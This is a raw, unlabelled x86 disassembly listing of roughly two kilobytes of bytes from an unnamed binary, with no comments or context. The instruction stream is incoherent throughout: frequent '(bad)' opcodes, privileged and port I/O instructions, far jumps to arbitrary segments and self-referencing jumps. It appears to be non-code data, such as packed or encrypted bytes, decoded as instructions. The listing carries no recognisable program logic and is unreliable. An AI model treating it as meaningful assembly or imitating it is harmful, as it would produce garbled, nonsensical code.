  409265:	or     esi,DWORD PTR [ecx-0x59]
  409268:	and    BYTE PTR [edx],dh
  40926a:	mov    bl,0x4a
  40926c:	jmp    0x2bbd:0x66a725ec
  409273:	sub    esp,DWORD PTR [ecx+0x24]
  409276:	std    
  409277:	push   es
  409278:	addr16 retf 
  40927a:	cmp    al,0xa3
  40927c:	mov    esp,0x6be88771
  409281:	es sbb al,0xbf
  409284:	daa    
  409285:	or     DWORD PTR [edx-0x6a],ebp
  409288:	xor    ebp,DWORD PTR [edx]
  40928a:	repnz ss mov al,0x3b
  40928e:	jbe    0x409237
  409290:	xchg   edx,eax
  409291:	sti    
  409292:	jb     0x40922a
  409294:	fsub   QWORD PTR [eax+0x34]
  409297:	int    0x38
  409299:	sbb    al,0x93
  40929b:	and    DWORD PTR [eax-0x32],edx
  40929e:	lds    eax,FWORD PTR [esi+edi*2-0x136dfc12]
  4092a5:	ins    BYTE PTR es:[edi],dx
  4092a6:	lds    esi,FWORD PTR cs:[ebx+0x4d]
  4092aa:	movups xmm2,XMMWORD PTR [edx-0x623ac23c]
  4092b1:	push   esi
  4092b2:	push   di
  4092b4:	or     dh,0x28
  4092b7:	dec    esp
  4092b8:	(bad)  
  4092b9:	mov    ebx,0x7ba24dca
  4092be:	iret   
  4092bf:	mov    dl,0x48
  4092c1:	aam    0xcc
  4092c3:	lods   eax,DWORD PTR ds:[esi]
  4092c4:	je     0x409300
  4092c6:	mov    ecx,0x7908dabb
  4092cb:	and    eax,0xfc816041
  4092d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092d1:	mov    BYTE PTR [edx+0x2a],al
  4092d4:	mov    ah,0xd7
  4092d6:	fucomp st(3)
  4092d8:	sbb    al,0xfd
  4092da:	shl    BYTE PTR [edx],cl
  4092dc:	xchg   esi,eax
  4092dd:	fsubr  st(3),st
  4092df:	aas    
  4092e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092e1:	in     al,0x24
  4092e3:	mov    esi,0xe3458f63
  4092e8:	in     eax,dx
  4092e9:	cmp    edx,DWORD PTR [eax-0x38fdaf8e]
  4092ef:	push   es
  4092f0:	jae    0x40933c
  4092f2:	mov    edi,0x46ee1505
  4092f7:	jl     0x4092b3
  4092f9:	clc    
  4092fa:	and    al,BYTE PTR [eax]
  4092fc:	je     0x409360
  4092fe:	mov    esp,0x539cec5a
  409303:	and    BYTE PTR [ebx+0x51b7b04d],al
  409309:	cmp    al,0xdf
  40930b:	(bad)  
  40930c:	stc    
  40930d:	fwait
  40930e:	dec    eax
  40930f:	sub    DWORD PTR [ebx+0x71802fb3],esp
  409315:	cmc    
  409316:	push   0x11633cd2
  40931b:	cli    
  40931c:	lea    edi,cs:[ebx+0x47773e0d]
  409323:	lock inc ebx
  409325:	adc    edi,DWORD PTR [ebx+0x52e7fda6]
  40932b:	dec    edi
  40932c:	out    0xb,al
  40932e:	pop    ds
  40932f:	ins    BYTE PTR es:[edi],dx
  409330:	bound  ebx,QWORD PTR [eax+ebp*4]
  409333:	out    0x9f,al
  409335:	adc    al,BYTE PTR [ecx]
  409337:	lea    esp,[ebx+ebx*8-0x30]
  40933b:	stos   BYTE PTR es:[edi],al
  40933c:	dec    edx
  40933d:	es pop ss
  40933f:	xlat   BYTE PTR ds:[ebx]
  409340:	mov    dl,0x34
  409342:	les    edi,FWORD PTR [esp+edx*2+0x5e9cc445]
  409349:	or     BYTE PTR [eax],cl
  40934b:	dec    ebp
  40934c:	fsubr  st,st(6)
  40934e:	scas   al,BYTE PTR es:[edi]
  40934f:	icebp  
  409350:	jp     0x4093a1
  409352:	test   eax,0x332d7ef7
  409357:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409358:	mov    ds:0x6dceddc5,al
  40935d:	cmp    DWORD PTR [ebx-0x31],0x54
  409361:	cmp    bl,BYTE PTR [edi+0x19]
  409364:	jmp    0x3297:0xd6302aa5
  40936b:	inc    edx
  40936c:	jns    0x4093ba
  40936e:	test   DWORD PTR [eax+eiz*1-0x5eaf5a80],edx
  409375:	xchg   BYTE PTR [ebx+0x520f90e2],bl
  40937b:	lahf   
  40937c:	and    al,0x77
  40937e:	out    0xc5,eax
  409380:	clc    
  409381:	fcom   QWORD PTR [esi]
  409383:	push   edx
  409384:	jmp    0x2ffa9fe0
  409389:	sub    al,0x5f
  40938b:	adc    esp,edi
  40938d:	scas   al,BYTE PTR es:[edi]
  40938e:	stos   BYTE PTR es:[edi],al
  40938f:	or     al,BYTE PTR [ebp+0x53]
  409392:	ins    BYTE PTR es:[di],dx
  409394:	lods   al,BYTE PTR ds:[esi]
  409395:	add    ecx,DWORD PTR [ebx+0x40d03170]
  40939b:	dec    edi
  40939c:	(bad)  
  40939d:	pop    ebp
  40939e:	cmc    
  40939f:	(bad)  
  4093a0:	lahf   
  4093a1:	jne    0x409394
  4093a3:	lock loop 0x4093c7
  4093a6:	rcl    DWORD PTR [eax+edx*8],1
  4093a9:	inc    eax
  4093aa:	outs   dx,DWORD PTR ds:[esi]
  4093ab:	lea    ebx,[esi]
  4093ad:	lock mov dl,0xef
  4093b0:	pop    edi
  4093b1:	mov    al,0xbb
  4093b3:	rcr    eax,0xa7
  4093b6:	iret   
  4093b7:	scas   al,BYTE PTR es:[edi]
  4093b8:	push   ss
  4093b9:	pop    ss
  4093ba:	inc    eax
  4093bb:	dec    ebp
  4093bc:	dec    BYTE PTR [ebp-0x50]
  4093bf:	mov    ds:0x8ae4a9b5,eax
  4093c4:	ins    DWORD PTR es:[edi],dx
  4093c5:	cmp    BYTE PTR [edx-0x52a37467],0x43
  4093cc:	int    0x7c
  4093ce:	cwde   
  4093cf:	fcom   QWORD PTR [ecx]
  4093d1:	jmp    0x82be60cb
  4093d6:	out    dx,eax
  4093d7:	inc    ebx
  4093d8:	mov    ebx,eax
  4093da:	in     eax,0x17
  4093dc:	addr16 into 
  4093de:	dec    edx
  4093df:	add    ch,BYTE PTR [eax+0x216af4b7]
  4093e5:	js     0x409401
  4093e7:	sub    al,BYTE PTR [esi-0x1627d970]
  4093ed:	or     eax,0x99838199
  4093f2:	scas   al,BYTE PTR es:[edi]
  4093f3:	mov    cl,0xfa
  4093f5:	loop   0x4093f5
  4093f7:	push   0xaf1decd1
  4093fc:	pop    edi
  4093fd:	bound  ecx,QWORD PTR [esi]
  4093ff:	xchg   edx,eax
  409400:	mov    ecx,0x395472b8
  409405:	add    BYTE PTR [edi-0x40e69b2a],al
  40940b:	pop    esp
  40940c:	adc    BYTE PTR [ebx],al
  40940e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40940f:	inc    ecx
  409410:	test   BYTE PTR [esp+edx*8-0x26],al
  409414:	inc    eax
  409415:	or     esp,edx
  409417:	jmp    0x409446
  409419:	outs   dx,DWORD PTR ds:[esi]
  40941a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40941b:	int    0x16
  40941d:	scas   eax,DWORD PTR es:[edi]
  40941e:	test   eax,0x51dd816b
  409423:	aam    0x95
  409425:	sbb    bl,BYTE PTR [esi]
  409427:	adc    edx,DWORD PTR [edi]
  409429:	nop
  40942a:	cmp    BYTE PTR [ebx+0x30],dl
  40942d:	sub    dh,dh
  40942f:	mov    ch,0x7f
  409431:	xor    esp,DWORD PTR [ebx+0x7f]
  409434:	lea    ecx,[ecx+ecx*4+0x4e1f1f9d]
  40943b:	jo     0x409405
  40943d:	add    bh,BYTE PTR [ecx-0x8]
  409440:	iret   
  409441:	cmp    al,0x25
  409443:	(bad)  
  409444:	stc    
  409445:	subps  xmm0,xmm2
  409448:	and    edx,edx
  40944a:	stos   BYTE PTR es:[edi],al
  40944b:	adc    DWORD PTR [ecx-0x6],ebx
  40944e:	xchg   edi,eax
  40944f:	and    eax,0xd825c86c
  409454:	pop    edx
  409455:	out    dx,al
  409456:	add    edx,DWORD PTR [edx+ebp*2]
  409459:	sbb    BYTE PTR [edi],0x4d
  40945c:	and    BYTE PTR [edi],cl
  40945e:	xor    eax,0x920807ca
  409463:	jne    0x4094c1
  409465:	inc    esp
  409466:	jmp    0xc448095b
  40946b:	addr16 or ah,dl
  40946e:	mov    edx,DWORD PTR [ebx+0x15fac022]
  409474:	add    al,0xeb
  409476:	jge    0x4094d4
  409478:	outs   dx,BYTE PTR ds:[esi]
  409479:	sbb    BYTE PTR [ebx+ecx*8],cl
  40947c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40947d:	mov    ds:0xda55ac87,eax
  409482:	arpl   WORD PTR [ebp+0x249b31ed],si
  409488:	fcom   DWORD PTR [ecx+edx*4+0x18]
  40948c:	or     cl,bh
  40948e:	in     eax,0xa2
  409490:	fidiv  WORD PTR ds:0x88bd7db9
  409497:	in     al,0x55
  409499:	push   ds
  40949a:	adc    ecx,eax
  40949c:	sub    al,0x5
  40949e:	inc    esi
  40949f:	mov    eax,ds:0xa45d5bd8
  4094a4:	gs jbe 0x4094a4
  4094a7:	aam    0x43
  4094a9:	mov    cs,WORD PTR [eax-0x6c]
  4094ac:	das    
  4094ad:	jecxz  0x409440
  4094af:	xor    ebp,esp
  4094b1:	das    
  4094b2:	and    BYTE PTR [eax-0x7b],0x9e
  4094b6:	in     al,0x34
  4094b8:	add    DWORD PTR ss:[ebp-0x1],ebx
  4094bc:	inc    esp
  4094bd:	and    BYTE PTR [edi-0xe83411d],bl
  4094c3:	popf   
  4094c4:	out    dx,eax
  4094c5:	push   edi
  4094c6:	lods   al,BYTE PTR ds:[esi]
  4094c7:	sbb    eax,0xe19cd599
  4094cc:	shl    BYTE PTR [ebx-0x241db93],0xad
  4094d3:	inc    edx
  4094d4:	dec    esi
  4094d5:	jl     0x409462
  4094d7:	add    BYTE PTR [eax+0x107b5dee],dh
  4094dd:	push   cs
  4094de:	inc    esp
  4094df:	xor    bl,BYTE PTR [edx-0x5d]
  4094e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094e3:	lods   eax,DWORD PTR ds:[esi]
  4094e4:	fsubr  DWORD PTR [eax+0x1a]
  4094e7:	out    0x46,eax
  4094e9:	daa    
  4094ea:	mov    esp,0x33c5f48e
  4094ef:	sbb    dh,BYTE PTR [ebp-0x164bcc86]
  4094f5:	inc    ebx
  4094f6:	out    0xfa,eax
  4094f8:	(bad)  
  4094fa:	sub    edi,DWORD PTR [ecx-0x76dbc418]
  409500:	call   0x68d1e57
  409505:	add    al,0xad
  409507:	in     eax,dx
  409508:	push   edx
  409509:	repnz shr DWORD PTR [ecx-0x10],0x82
  40950e:	ins    BYTE PTR es:[edi],dx
  40950f:	cmp    esi,DWORD PTR [edi+0x3a]
  409512:	add    eax,0xb6bb55e8
  409517:	push   edx
  409518:	in     al,dx
  409519:	bound  ecx,QWORD PTR [edx+eax*1-0x1e]
  40951d:	jp     0x409575
  40951f:	es btc edx,esi
  409523:	rcr    bh,cl
  409525:	add    bl,ah
  409527:	pop    es
  409528:	clc    
  409529:	jg     0x4095a9
  40952b:	js     0x4094ea
  40952d:	je     0x409520
  40952f:	mov    eax,0x4ad459f8
  409534:	pop    edx
  409535:	inc    edx
  409536:	pusha  
  409537:	push   edi
  409538:	scas   al,BYTE PTR es:[edi]
  409539:	pop    eax
  40953a:	dec    ebx
  40953b:	fstp   TBYTE PTR [esi+0x3b450a06]
  409541:	dec    edx
  409542:	xor    DWORD PTR [esp+edi*2+0x6f],esp
  409546:	or     eax,0xcf33010a
  40954b:	fs mov cl,0x75
  40954e:	dec    ebx
  40954f:	push   es
  409550:	inc    ebp
  409551:	int    0x8e
  409553:	pop    ss
  409554:	iret   
  409555:	inc    esp
  409556:	adc    eax,0xffbee648
  40955b:	mov    dl,0x52
  40955d:	jb     0x4095de
  40955f:	inc    ebx
  409560:	xor    ch,bl
  409562:	scas   eax,DWORD PTR es:[edi]
  409563:	add    BYTE PTR [eax+esi*2-0x1e620e2f],ch
  40956a:	jo     0x4095d8
  40956c:	mov    DWORD PTR ds:[edx+0x24],ebx
  409570:	mov    al,0xc2
  409572:	inc    esi
  409573:	sahf   
  409574:	aad    0x31
  409576:	mov    ds:0x6847e4ac,eax
  40957b:	jmp    0x48c850e7
  409580:	popa   
  409581:	shr    dh,1
  409583:	sbb    eax,0xf9cb82fc
  409588:	test   eax,0xddb742d0
  40958d:	mov    ds:0x5a890eed,al
  409592:	adc    dl,BYTE PTR [ebx-0x3c]
  409595:	inc    edx
  409596:	scas   al,BYTE PTR es:[edi]
  409597:	or     BYTE PTR [eax],al
  409599:	pushf  
  40959a:	xchg   BYTE PTR [ebx+0x112e138b],dl
  4095a0:	clc    
  4095a1:	imul   esp,DWORD PTR [edx],0x91ae9e07
  4095a7:	pop    edx
  4095a8:	cmp    dl,ah
  4095aa:	fisttp WORD PTR [ecx]
  4095ac:	xor    al,0x51
  4095ae:	xchg   ecx,eax
  4095af:	pop    edx
  4095b0:	or     edx,DWORD PTR ss:[ebx+edx*2+0x5def121a]
  4095b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095b9:	cs xor eax,0xe4a93db6
  4095bf:	ficom  DWORD PTR [eax-0x3d]
  4095c2:	push   ebp
  4095c3:	retf   0x477e
  4095c6:	aam    0x83
  4095c8:	ds push eax
  4095ca:	mov    esi,0xfe3608d9
  4095cf:	dec    edx
  4095d0:	cmp    eax,0x773dde9d
  4095d5:	and    esp,esi
  4095d7:	mov    cl,0x1f
  4095d9:	loop   0x409575
  4095db:	ins    BYTE PTR es:[edi],dx
  4095dc:	sbb    DWORD PTR [edx+0x5ae885ce],edx
  4095e2:	clc    
  4095e3:	repnz mov ch,0x34
  4095e6:	pusha  
  4095e7:	jae    0x409652
  4095e9:	jg     0x4095cd
  4095eb:	xchg   DWORD PTR [ebx-0x768d611e],ecx
  4095f1:	loope  0x40958c
  4095f3:	adc    BYTE PTR [eax+0x2c],0xc4
  4095f7:	das    
  4095f8:	xor    ah,BYTE PTR [edx+0x611f7f84]
  4095fe:	test   eax,0xb89afa82
  409603:	sub    eax,0x545a0a9e
  409608:	shr    DWORD PTR [esi+edi*2],cl
  40960b:	inc    ebx
  40960c:	int    0x8a
  40960e:	pop    esp
  40960f:	mov    WORD PTR [edx-0x3],?
  409612:	mov    edi,0x19c619d5
  409617:	adc    ah,BYTE PTR [esp+eax*2]
  40961a:	rcr    al,cl
  40961c:	outs   dx,BYTE PTR ds:[esi]
  40961d:	stos   DWORD PTR es:[edi],eax
  40961e:	dec    esp
  40961f:	mov    dh,BYTE PTR [edx+0xa]
  409622:	scas   eax,DWORD PTR es:[edi]
  409623:	xor    eax,0xe3530a4a
  409628:	sahf   
  409629:	adc    al,0xdd
  40962b:	pusha  
  40962c:	and    al,0xf1
  40962e:	xchg   edi,eax
  40962f:	cmc    
  409630:	cld    
  409631:	adc    DWORD PTR [ebx],0xb
  409634:	ss aam 0x86
  409637:	(bad)  
  409638:	les    ebp,FWORD PTR [ecx+edx*1]
  40963b:	mov    esi,?
  40963d:	inc    ebp
  40963e:	fidiv  DWORD PTR [eax]
  409640:	test   al,0x10
  409642:	jecxz  0x40962b
  409644:	jl     0x409605
  409646:	or     eax,0x7c231526
  40964b:	bt     esi,ecx
  40964e:	fcomp  QWORD PTR [edx+0x58]
  409651:	stos   BYTE PTR es:[edi],al
  409652:	add    DWORD PTR [ebx+0x5745cb0],0x0
  409659:	mov    ch,0x98
  40965b:	pop    esp
  40965d:	mov    ebp,0x17404c4a
  409662:	sbb    DWORD PTR [edi-0x66756ffd],0x68
  409669:	ret    
  40966a:	fld1   
  40966c:	retf   0x8496
  40966f:	mov    ebx,0xebcb427
  409674:	mov    eax,ds:0x8e42507b
  409679:	dec    eax
  40967a:	cwde   
  40967b:	jmp    0xf48b:0x3a71efc0
  409682:	shl    BYTE PTR ds:0xe584b644,cl
  409688:	fldenv [ebx]
  40968a:	add    edi,DWORD PTR [ecx+eax*4+0x2c]
  40968e:	je     0x409688
  409690:	mov    eax,ds:0x2c53427
  409695:	mov    esi,0xc050df17
  40969a:	mov    ebp,0xc7ab69b3
  40969f:	xchg   esi,eax
  4096a0:	add    eax,0x1dbe0914
  4096a5:	sbb    al,0x96
  4096a7:	aaa    
  4096a8:	daa    
  4096a9:	(bad)  
  4096aa:	jmp    0x2071661f
  4096af:	ret    0x2923
  4096b2:	loope  0x40967a
  4096b4:	mov    ebx,0xb8630384
  4096b9:	das    
  4096ba:	push   0xffffff8b
  4096bc:	mov    ds:0x2619152f,eax
  4096c1:	or     DWORD PTR [ebp+0x7a],ebp
  4096c4:	lods   eax,DWORD PTR ds:[esi]
  4096c5:	cmp    bl,BYTE PTR [edi+ebx*1+0x5]
  4096c9:	mov    ecx,DWORD PTR [ecx+0x67051a3e]
  4096cf:	xchg   ebx,eax
  4096d0:	test   DWORD PTR [ebp-0x253befb],ebp
  4096d6:	std    
  4096d7:	push   esi
  4096d8:	xlat   BYTE PTR ds:[ebx]
  4096d9:	adc    eax,0x267f7ae1
  4096de:	jns    0x409666
  4096e0:	nop
  4096e1:	and    eax,0x29a386d8
  4096e6:	push   edi
  4096e7:	xchg   ecx,eax
  4096e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096e9:	dec    edx
  4096ea:	in     al,0x46
  4096ec:	fcomp  DWORD PTR [esi-0x37c9c29b]
  4096f2:	ja     0x40968e
  4096f4:	shl    BYTE PTR [ebp+0x48c66ea1],1
  4096fa:	sbb    ebx,DWORD PTR [ecx+0xc]
  4096fd:	inc    ebp
  4096fe:	or     BYTE PTR [ecx-0x1967e3e7],dl
  409704:	clc    
  409705:	fiadd  WORD PTR [esi+ebx*4+0x194df3bb]
  40970c:	ss ret 
  40970e:	es push ss
  409710:	xchg   edx,eax
  409711:	clc    
  409712:	mov    bh,BYTE PTR [eax]
  409714:	mov    al,ds:0x50110266
  409719:	inc    edx
  40971a:	ins    DWORD PTR es:[edi],dx
  40971b:	in     al,0x91
  40971d:	dec    ebx
  40971e:	repz fidivr WORD PTR [di+0x7c2d]
  409724:	or     al,BYTE PTR [ecx-0x4509605]
  40972a:	into   
  40972b:	mov    ds:0x6571bf85,al
  409730:	pop    ebp
  409731:	test   BYTE PTR [edx-0x51],bh
  409734:	sbb    ebx,DWORD PTR [edi]
  409736:	add    esi,DWORD PTR [ebx]
  409738:	jne    0x40977a
  40973a:	mov    WORD PTR [esi+0x3249a66e],?
  409740:	shl    dl,cl
  409742:	inc    esp
  409743:	cmp    BYTE PTR [ebx-0x3e79ee35],al
  409749:	push   es
  40974a:	dec    ecx
  40974b:	push   ebp
  40974c:	test   eax,0x57d1301
  409751:	shl    dh,cl
  409753:	gs loope 0x409777
  409756:	fst    DWORD PTR [eax]
  409758:	shl    eax,1
  40975a:	inc    edi
  40975b:	cmp    edi,DWORD PTR [esi]
  40975d:	adc    DWORD PTR ds:0x8c32fbd5,eax
  409763:	sub    BYTE PTR [ebp+0x5d],cl
  409766:	push   ebx
  409767:	push   0xffffffa4
  409769:	lods   al,BYTE PTR ds:[esi]
  40976a:	rcl    ch,1
  40976c:	or     cl,0x58
  40976f:	lds    edi,FWORD PTR [edi-0x14645d5c]
  409775:	pop    ecx
  409776:	leave  
  409777:	retf   0x6c00
  40977a:	les    eax,FWORD PTR [esi+edi*1]
  40977d:	shl    BYTE PTR [ebx],cl
  40977f:	mov    edx,0xcdb15a09
  409784:	mov    ch,0xfe
  409786:	pop    esp
  409787:	pop    ds
  409788:	pop    esp
  409789:	dec    ecx
  40978a:	jmp    0x40977e
  40978c:	xchg   edx,eax
  40978d:	jp     0x409795
  40978f:	jge    0x4097a6
  409791:	shr    BYTE PTR [edi-0x4b7d95c6],0xb1
  409798:	push   es
  409799:	imul   esi,DWORD PTR [ebx],0x4bf68d66
  40979f:	outs   dx,BYTE PTR ds:[esi]
  4097a0:	mov    bl,0xe2
  4097a2:	rcl    BYTE PTR [eax],0xa0
  4097a5:	mov    WORD PTR [edi-0x3267deb4],ss
  4097ab:	mov    esp,0x57530155
  4097b0:	mov    edi,0x891993cc
  4097b5:	and    BYTE PTR [edi-0x3249d805],bl
  4097bb:	xchg   edx,eax
  4097bc:	and    DWORD PTR [edi+edi*4-0x336b7bc],0x3b1d2522
  4097c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097c8:	gs jge 0x40981e
  4097cb:	cwde   
  4097cc:	push   edi
  4097cd:	test   DWORD PTR ds:[ebx],ecx
  4097d0:	mov    esp,0x97d2eea2
  4097d5:	mov    bh,0xa3
  4097d7:	and    al,0x30
  4097d9:	lock pop esi
  4097db:	cmp    eax,0x2adce33d
  4097e0:	jle    0x40983c
  4097e2:	push   0xffffffc7
  4097e4:	dec    esp
  4097e5:	xor    BYTE PTR [edx+0x63fcbb8b],0xec
  4097ec:	cmp    ch,BYTE PTR [ebp-0x44]
  4097ef:	aam    0x54
  4097f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097f2:	cmp    eax,0x3a4ab1e2
  4097f7:	pop    ecx
  4097f8:	xor    DWORD PTR [ecx+0x41],esi
  4097fb:	jns    0x409823
  4097fd:	or     DWORD PTR [esp+eax*8+0x7751ef2],edi
  409804:	jle    0x40980c
  409806:	jecxz  0x4097af
  409808:	dec    esi
  409809:	cmp    DWORD PTR [ebp+0x5b94ac5a],eax
  40980f:	out    dx,eax
  409810:	xor    esp,DWORD PTR [ebx+0x3b]
  409813:	outs   dx,DWORD PTR ds:[esi]
  409814:	cwde   
  409815:	cmp    ah,BYTE PTR [edi+0x5f]
  409818:	sbb    al,0xb8
  40981a:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40981c:	outs   dx,DWORD PTR ds:[esi]
  40981d:	sub    cl,dl
  40981f:	sub    DWORD PTR [esi+ecx*4+0x31],ebx
  409823:	add    bh,ah
  409825:	cmovae esi,DWORD PTR [ecx-0x4a]
  409829:	mov    ch,0xdc
  40982b:	and    al,0x96
  40982d:	adc    dh,dl
  40982f:	xchg   bl,dh
  409831:	jae    0x40988e
  409833:	mov    bh,0x46
  409835:	or     esp,DWORD PTR [ebp-0x1]
  409838:	jp     0x4097be
  40983a:	fnstsw WORD PTR [esi]
  40983c:	aaa    
  40983d:	jnp    0x4098b5
  40983f:	ja     0x40989a
  409841:	cmp    BYTE PTR [ebx],ah
  409843:	push   es
  409844:	lock sbb eax,ebx
  409847:	gs push cs
  409849:	jo     0x409846
  40984b:	and    ah,BYTE PTR [ebp-0x3]
  40984e:	je     0x40989d
  409850:	in     al,dx
  409851:	sub    al,0x7f
  409853:	inc    ebp
  409854:	jge    0x4097e6
  409856:	mov    al,ds:0xc71ae670
  40985b:	enter  0x746a,0xcc
  40985f:	loope  0x4097f7
  409861:	aad    0x84
  409863:	sub    eax,0xb0e9066e
  409868:	icebp  
  409869:	adc    BYTE PTR [ebx],al
  40986b:	cmp    DWORD PTR [ebp-0x3cb903a1],edi
  409871:	sbb    eax,0xc6a54799
  409876:	sar    BYTE PTR [ebp+eiz*8+0x528f296f],cl
  40987d:	outs   dx,BYTE PTR ds:[esi]
  40987e:	ss or  eax,0x54104a53
  409884:	mov    al,ds:0x2fb3aec1
  409889:	cld    
  40988a:	adc    DWORD PTR [edx-0x20],ebx
  40988d:	xchg   esp,eax
  40988e:	inc    esp
  40988f:	in     al,0xe3
  409891:	jg     0x409814
  409893:	ss cs add dl,dh
  409897:	fcomp  QWORD PTR [eax-0x3a]
  40989a:	jae    0x4098ab
  40989c:	outs   dx,BYTE PTR ds:[esi]
  40989d:	ins    BYTE PTR es:[edi],dx
  40989e:	mov    ebp,0x8bd8b4b9
  4098a3:	icebp  
  4098a4:	mov    ecx,ecx
  4098a6:	repz sar eax,0x74
  4098aa:	mov    dl,0x86
  4098ac:	adc    al,0xeb
  4098ae:	fwait
  4098af:	push   ebp
  4098b0:	or     BYTE PTR [edx+0x28],dh
  4098b3:	test   al,0xbf
  4098b5:	or     eax,0x27dda814
  4098ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098bb:	dec    eax
  4098bc:	(bad)  
  4098bd:	jmp    0x409938
  4098bf:	and    al,0x8b
  4098c1:	lea    ebx,[edx]
  4098c3:	add    eax,0xb6d883e8
  4098c8:	stos   DWORD PTR es:[edi],eax
  4098c9:	ins    DWORD PTR es:[edi],dx
  4098ca:	or     ebx,DWORD PTR [ebx]
  4098cc:	jle    0x4098b8
  4098ce:	verr   WORD PTR [ecx*4+0x4180ff40]
  4098d6:	push   esp
  4098d7:	cwde   
  4098d8:	shr    DWORD PTR [ebp-0x6961084],1
  4098de:	aam    0xe7
  4098e0:	out    0xb,al
  4098e2:	ja     0x409913
  4098e4:	mov    eax,0xac40dd23
  4098e9:	adc    esp,ebp
  4098eb:	mov    eax,ds:0x443fc5d3
  4098f0:	scas   eax,DWORD PTR es:[edi]
  4098f1:	inc    edx
  4098f2:	fsub   st(4),st
  4098f4:	adc    eax,0x69fe601b
  4098f9:	pop    ebx
  4098fa:	lods   eax,DWORD PTR ds:[esi]
  4098fb:	js     0x4098f0
  4098fd:	xchg   esi,eax
  4098fe:	mov    esp,0x46b2522c
  409903:	clc    
  409904:	jecxz  0x4098e6
  409906:	popa   
  409907:	hlt    
  409908:	cs mov esp,gs
  40990b:	adc    edi,eax
  40990d:	sub    BYTE PTR [ebx],0x45
  409910:	xchg   edx,eax
  409911:	sahf   
  409912:	xor    al,0x7e
  409914:	jae    0x40997e
  409916:	xchg   esp,eax
  409917:	mov    edx,0xb5f51315
  40991c:	nop
  40991d:	cmp    esp,edi
  40991f:	push   edi
  409920:	rol    DWORD PTR [eax-0x2c],0xfe
  409924:	mul    ah
  409926:	into   
  409927:	inc    eax
  409928:	mov    edi,0x90e90d5b
  40992d:	shl    DWORD PTR [esi-0x248489ac],1
  409933:	neg    bh
  409935:	popa   
  409936:	adc    ebx,DWORD PTR [esi]
  409938:	aaa    
  409939:	inc    edi
  40993a:	shr    DWORD PTR [ebx],1
  40993c:	mov    bl,0x8d
  40993e:	inc    esp
  40993f:	jnp    0x4099b9
  409941:	rol    DWORD PTR [esi],0x69
  409944:	pushf  
  409945:	fstp   TBYTE PTR [eax]
  409947:	fs mov ch,0x5a
  40994a:	cdq    
  40994b:	mov    ch,0xff
  40994d:	xor    eax,0xc826a22f
  409952:	in     eax,0x69
  409954:	add    eax,0x9148ff6e
  409959:	fucomi st,st(3)
  40995b:	xchg   BYTE PTR [eax],bl
  40995d:	int    0xc5
  40995f:	fsubr  DWORD PTR [edi+0x2d]
  409962:	cli    
  409963:	popa   
  409964:	lea    eax,[esi+ebx*4-0x55d57802]
  40996b:	lock pop edx
  40996d:	mov    dl,0x81
  40996f:	jg     0x40990d
  409971:	xor    al,0xd1
  409973:	rcl    BYTE PTR [ebx],0x1c
  409976:	dec    edx
  409977:	dec    esp
  409978:	call   0xcc77f040
  40997d:	cmp    edi,ebp
  40997f:	(bad)  
  409980:	jns    0x40990b
  409982:	int    0x82
  409984:	rcl    DWORD PTR [edi-0x341b81fa],0xf3
  40998b:	xchg   ebx,eax
  40998c:	mov    esi,DWORD PTR [esi-0x54c31eec]
  409992:	stos   DWORD PTR es:[edi],eax
  409993:	je     0x4099ad
  409995:	pushf  
  409996:	xlat   BYTE PTR ds:[ebx]
  409997:	ds jno 0x409938
  40999a:	mov    al,ds:0x39a7113f
  40999f:	jb     0x409933
  4099a1:	in     al,dx
  4099a2:	ja     0x40994a
  4099a4:	adc    eax,0x831710fe
  4099a9:	in     eax,dx
  4099aa:	out    0x10,al
  4099ac:	cmp    cl,BYTE PTR [ecx-0x12]
  4099af:	(bad)  
  4099b0:	sub    BYTE PTR [edi],bl
  4099b2:	cld    
  4099b3:	sub    DWORD PTR [ecx],0x52
  4099b6:	aas    
  4099b7:	ja     0x4099b7
  4099b9:	lea    ecx,[ecx+0x7bba8eb3]
  4099bf:	xchg   edx,eax
  4099c0:	int3   
  4099c1:	jae    0x4099fb
  4099c3:	pop    ecx
  4099c4:	sar    DWORD PTR [edi-0x29],0x9d
  4099c8:	sbb    eax,0xe29a724b
  4099cd:	mov    dl,0x32
  4099cf:	push   esi
  4099d0:	add    BYTE PTR [ebp+0x614da268],cl
  4099d6:	xchg   esi,eax
  4099d7:	scas   al,BYTE PTR es:[edi]
  4099d8:	in     al,0x7e
  4099da:	jo     0x4099b1
  4099dc:	nop
  4099dd:	sbb    DWORD PTR ds:[ecx],esi
  4099e0:	test   al,0x9
  4099e2:	neg    dh
  4099e4:	stc    
  4099e5:	push   ss
  4099e6:	jnp    0x4099fa
  4099e8:	adc    al,0xfe
  4099ea:	fdivrp st(2),st
  4099ec:	jmp    0x4099ee
  4099ee:	icebp  
  4099ef:	jb     0x4099f4
  4099f1:	loop   0x4099c2
  4099f3:	lahf   
  4099f4:	jp     0x409a54
  4099f6:	xchg   edx,eax
  4099f7:	repz dec eax
  4099f9:	mov    bh,0x1a
  4099fb:	push   ds
  4099fc:	and    BYTE PTR [eax],dh
  4099fe:	and    bl,BYTE PTR [edi+0x3f]
  409a01:	or     esi,DWORD PTR ds:0x7a5d764c
  409a07:	mov    eax,ds:0x37cf313
  409a0c:	sar    DWORD PTR [esp+ebx*2-0x75],cl
  409a10:	mov    al,ds:0xbf883f13
  409a15:	push   es
  409a16:	clc    
  409a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a18:	mov    al,ds:0xa7040581
  409a1d:	sbb    bh,BYTE PTR [eax]
  409a1f:	ret    
  409a20:	xchg   cl,cl
  409a22:	adc    eax,0x125ec005
  409a27:	fistp  QWORD PTR [ebx]
  409a29:	mov    fs,esp
  409a2b:	aaa    
  409a2c:	inc    ecx
  409a2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a2e:	pop    eax
